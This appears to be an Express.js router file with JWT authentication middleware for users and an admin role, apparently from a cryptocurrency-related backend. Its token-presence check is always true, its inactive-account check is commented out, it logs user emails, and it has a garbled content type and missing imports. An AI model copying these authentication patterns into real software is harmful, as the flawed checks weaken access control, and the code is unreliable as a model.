const getFile = require('../controllers/getFile');

router.get("/uploads/:image", getFile.getImage);


router.get("/", function (request, response) {
    response.contentType("routerlication/json");
    response.end(JSON.stringify("Node is running"));
});

router.get("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

router.post("*", function (req, res) {
    return res.status(200).json({
        code: 404,
        data: null,
        msg: "Invalid Request {URL Not Found}",
    });
});

function ensureWebToken(req, res, next) {
    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWT(req, res, next);
    } else {
        res.sendStatus(403);
    }
}

async function verifyJWT(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            console.log(err);
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            req.user_id = req.user.id;
            req.email = req.user.email;
            req.bnb_address = req.user.bnb_address;
            console.log(req.user.email);
            // check if user is active or not 
            let userDetails = await UserModel.getUsersDetails(req.user.email);
            next();
            // if (userDetails[0].is_active == 0) {
            //     return res.sendStatus(403);
            // } else {
            //     next();
            // }
        }
    })
}

function ensureWebTokenForAdmin(req, res, next) {

    const x_access_token = req.headers['authorization'];
    if (typeof x_access_token !== undefined) {
        req.token = x_access_token;
        verifyJWTForAdmin(req, res, next);
    } else {
        res.sendStatus(403);
    }
}


async function verifyJWTForAdmin(req, res, next) {
    jwt.verify(req.token, config.JWT_SECRET_KEY, async function (err, data) {
        if (err) {
            res.sendStatus(403);
        } else {
            const _data = await jwt.decode(req.token, {
                complete: true,
                json: true
            });
            req.user = _data['payload'];
            if (req.user.role != 'cpadmin') {
                return res.sendStatus(403);
            }
            next();
        }
    })
}



module.exports.routes = router;